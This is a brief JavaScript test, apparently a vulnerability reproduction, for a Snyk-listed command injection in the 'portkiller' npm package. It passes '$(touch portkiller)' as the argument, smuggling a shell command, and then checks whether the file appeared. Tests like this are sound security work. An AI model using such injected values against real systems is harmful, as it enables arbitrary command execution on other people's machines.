//https://snyk.io/vuln/SNYK-JS-PORTKILLER-1078537
test("Command Injection in portkiller", () => 
{
	const portkiller = require('portkiller');
	const fs = require('fs')
	const path = './portkiller'
	portkiller('$(touch portkiller)');


	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);
});








